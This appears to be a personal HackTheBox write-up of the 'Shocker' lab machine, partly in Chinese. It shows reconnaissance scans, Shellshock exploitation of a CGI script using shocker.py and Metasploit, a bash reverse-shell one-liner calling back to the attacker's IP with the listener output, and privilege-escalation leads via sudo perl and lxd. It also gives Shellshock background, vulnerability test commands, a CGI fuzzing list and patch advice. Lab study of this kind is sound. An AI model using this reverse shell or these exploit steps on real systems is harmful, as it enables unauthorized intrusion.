---
title: "HackTheBox笔记：Shocker"
slug: ei96cl
date: 2020-07-05T00:45:31+08:00
source: yuque/penetration
---

# Entry point
## nmap
```powershell
$ nmap -p- -sC -sV  -Pn 10.10.10.56 -oA allport
Nmap scan report for 10.10.10.56
Host is up (0.0037s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

hydra to brute SSH using fastrack.txt, nothing to gain.

## /cgi-bin/
using `binwalk` and `file`, got nothing special

![](https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594136861077-edc920b1-b5c0-477b-b5a9-71441f8930ed.jpeg)

dir searching

```markdown
python3 dirsearch.py -u http://10.10.10.56/ -e * 

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions:  | HTTP method: getSuffixes: CHANGELOG.md | HTTP method: get | Threads: 10 | Wordlist size: 6564 | Request count: 6564

Error Log: /opt/dirsearch/logs/errors-20-07-07_23-26-11.log

Target: http://10.10.10.56/

Output File: /opt/dirsearch/reports/10.10.10.56/20-07-07_23-26-16

[23:26:16] Starting: 
[23:28:27] 403 -  299B  - /.htaccess-dev
[23:28:27] 403 -  301B  - /.htaccess-local
[23:28:27] 403 -  301B  - /.htaccess-marco
[23:28:28] 403 -  298B  - /.htaccessBAK
[23:28:28] 403 -  299B  - /.htaccess.txt
[23:28:28] 403 -  302B  - /.htaccess.sample
[23:28:28] 403 -  299B  - /.htaccess.old
[23:28:28] 403 -  300B  - /.htaccess.orig
[23:28:28] 403 -  300B  - /.htaccess.save
[23:28:28] 403 -  300B  - /.htaccess.bak1
[23:28:28] 403 -  298B  - /.htaccessOLD
[23:28:28] 403 -  299B  - /.htaccessOLD2
[23:28:28] 403 -  299B  - /.htpasswd-old
[23:28:28] 403 -  297B  - /.httr-oauth
[23:34:58] 403 -  294B  - /cgi-bin/

```

after obtaining these, no progress.

## OSINT
while searching for  "**shocker cgi-bin**", finding a open-source project named _shocker, see_[ https://github.com/nccgroup/shocker](https://github.com/nccgroup/shocker)

add the ext of "**.sh, .cgi**" in dirbuster, 

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594136843939-1432239f-560b-43ec-8d61-aa0de544520c.png)

also, `dirb [http://10.10.10.56/cgi-bin](http://10.10.10.56/cgi-bin) -X .cgi,.sh,.php,.py,.pl` is supported.

## /cgi/bin/user.sh
```markdown
Content-Type: text/plain

Just an uptime test script

 11:46:01 up  1:16,  0 users,  load average: 0.00, 0.00, 0.00


```

the exp of **RCE** can be used at least in 2 ways

1st is the _shock_ scirpt

```markdown
./shocker.py -H 10.10.10.56 -c '/cgi-bin/user.sh'
```

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594137744360-0f8d0978-12e1-4092-b203-28358242f5be.png)

```markdown
# rce on shocker 
$ /bin/bash -i >& /dev/tcp/10.10.16.122/1337 0>&1
 No response
 
# get reverse shell
$ nc -lvp 1337 
listening on [any] 1337 ...
10.10.10.56: inverse host lookup failed: Unknown host
connect to [10.10.16.122] from (UNKNOWN) [10.10.10.56] 55964
bash: no job control in this shell

shelly@Shocker:/usr/lib/cgi-bin$ ls
	user.sh

shelly@Shocker:/usr/lib/cgi-bin$ id
  id
  uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)

```

the 2nd is **msf**

```markdown
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set lhost tun0 
	lhost => tun0
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set rhosts 10.10.10.56
	rhosts => 10.10.10.56
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set targeturi /cgi-bin/user.sh
	targeturi => /cgi-bin/user.sh
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.16.122:4444 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (980808 bytes) to 10.10.10.56

```

# priv esc
## sudo perl
```markdown
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
  sudo -l
  Matching Defaults entries for shelly on Shocker:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User shelly may run the following commands on Shocker:
      (root) NOPASSWD: /usr/bin/perl

```

## priv esc via lxd
```markdown
$ cat /etc/passwd
...
	lxd:x:106:65534::/var/lib/lxd/:/bin/false
...

$ id
uid=1000(shelly) ... 110(lxd) ...
```



# Note on ShellShock
![](https://cdn.nlark.com/yuque/0/2020/jpeg/166008/1594266649245-d88435b8-f042-4550-86fa-f91203014705.jpeg)

> GNU Bash  4.3及之前版本在评估某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行Shell命令。某些服务和应用允许未经身份验证的远程攻击者提供环境变量以利用此漏洞。此漏洞源于在调用Bash  Shell之前可以用构造的值创建环境变量。这些变量可以包含代码，在Shell被调用后会被立即执行。
>
> 以下几点值得特别注意：
>
> + 这个漏洞的英文是：ShellShock，中文名被XCERT命名为：破壳漏洞。
> + 来自CVSS的评分：破壳漏洞的严重性被定义为10级（最高），今年4月爆发的OpenSSL“心脏出血”漏洞才5级！
> + 破壳漏洞存在有25年，和Bash年龄一样。
>
> GNU Bash <= 4.3，此漏洞可能会影响到
>

![](https://cdn.nlark.com/yuque/0/2020/png/166008/1594266142774-e2a59a54-e481-4409-a882-d215069aceb9.png)

1. 对于HTTP头部，CGI脚本解析器会将其当作环境变量，调用bash的env相关函数设置到临时环境变量中；
2. HTTP协议允许发送任意客户端自定义的HTTP头部；
3. 这样就产生了一个完整的可供Bash命令注入的场景，客户端故意发送构造好的带攻击命令的HTTP头部到服务端，服务端调用设置环境变量的函数，直接执行了客户端指定的头部里面的命令。并且还会将结果一并返回给客户端。

## 原理
Shellshock的原理是利用了Bash在导入环境变量函数时候的漏洞，启动Bash的时候，它不但会导入这个函数，而且也会把函数定义后面的命令执行。在有些CGI脚本的设计中，数据是通过环境变量来传递的，这样就给了数据提供者利用Shellshock漏洞的机会。

目前的bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“`(){`”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。

Apache服务器中使用`mod_cgi`（不包括`mod_php`或`mod_python`）运行脚本的时候，数据是通过环境变量来传递的，这可以算是互联网领域最古老的一些技术了。

## 测试
可以使用如下命令来检查系统是否存在此漏洞（在本机Bash环境下运行）：

**破壳1，CVE-2014-6271**，测试方法：

`env x='() { :;}; echo vulnerable' bash -c "echo this is a test"`

如执行结果如下表明有漏洞：`vulnerable, this is a test`

---

**破壳****2****，****CVE-2014-7169****，**测试方法：

` env -i  X='() { (a)=>\' bash -c 'echo date'; cat echo`

如执行结果如下则仍然存在漏洞：

` bash: X: line 1: syntax error near unexpected token ='bash: X: line 1: 'bash: error importing function definition for `X'Wed Sep 24 14:12:49 PDT 2014`

...

## Fuzzing列表
经过ZoomEye的Fuzzing探测，Fuzzing列表如下：

```markdown
/cgi-bin/load.cgi
/cgi-bin/gsweb.cgi
/cgi-bin/redirector.cgi
/cgi-bin/test.cgi
/cgi-bin/index.cgi
/cgi-bin/help.cgi
/cgi-bin/about.cgi
/cgi-bin/vidredirect.cgi
/cgi-bin/click.cgi
/cgi-bin/details.cgi
/cgi-bin/log.cgi
/cgi-bin/viewcontent.cgi
/cgi-bin/content.cgi
/cgi-bin/admin.cgi
/cgi-bin/webmail.cgi
```

##  修复建议
现在可以按照下面方式进行Bash的升级修复：

| 操作系统 | 升级方式 |
| --- | --- |
| Ubuntu/Debian | apt-get update   apt-get install bash |
| RedHat/CentOS/Fedora | yum update -y bash |
| Arch Linux | pacman -Syu |
| OS X | brew update   brew install bash   sudo sh -c 'echo "/usr/local/bin/bash" >> /etc/shells'   chsh -s /usr/local/bin/bash   sudo mv /bin/bash /bin/bash-backup   sudo ln -s /usr/local/bin/bash /bin/bash |
| MacPorts | sudo port self update   sudo port upgrade bash |


 

建议升级后按上面的方法诊断是否补丁完全。



## 感慨
威胁经常在人们不期望它们到来的时候到来，也许是无心的雪崩，也许是有意的蓄谋。“病毒不会在星期天休息”这是安天新员工培训时必须传递的一句话，我们从柏松那里听到过这句话，我们也把这句话讲给过安天的新人。我们也许会在一瞬间被威胁打的措手不及，但不会有威胁能长久的逃逸出我们的感知和分析。

谨把我们的工作献给我们家人、我们的战友和我们的祖国

# reference
+ [https://www.anquanke.com/post/id/179407](https://www.anquanke.com/post/id/179407)
+ [https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd](https://fdlucifer.github.io/2020-01-20-Privilege-Escalation-via-lxd)
+ [Shocker](https://www.jianshu.com/p/66f74282a299)
+ [ nccgroup / shocker ](https://github.com/nccgroup/shocker)
+ [https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/](https://blog.knownsec.com/2014/10/shellshock_response_profile_v4/)
+ [https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/](https://blog.knownsec.com/2014/09/bash_3-0-4-3-command-exec-analysis/)
+ [https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt](https://raw.githubusercontent.com/citypw/DNFWAH/master/4/d4_0x07_DNFWAH_shellshock_bash_story_cve-2014-6271.txt)
+ [https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html](https://www.antiy.com/response/Analysis_Report_on_Sample_Set_of_Bash_Shellshock.html)
+ [https://blog.csdn.net/weixin_33709219/article/details/87981615](https://blog.csdn.net/weixin_33709219/article/details/87981615)
+ [https://www.antiy.com/response/CVE-2014-6271.html](https://www.antiy.com/response/CVE-2014-6271.html)
+ [https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html](https://www.smh.com.au/technology/stephane-chazelas-the-man-who-found-the-webs-most-dangerous-internet-security-bug-20140926-10mixr.html)

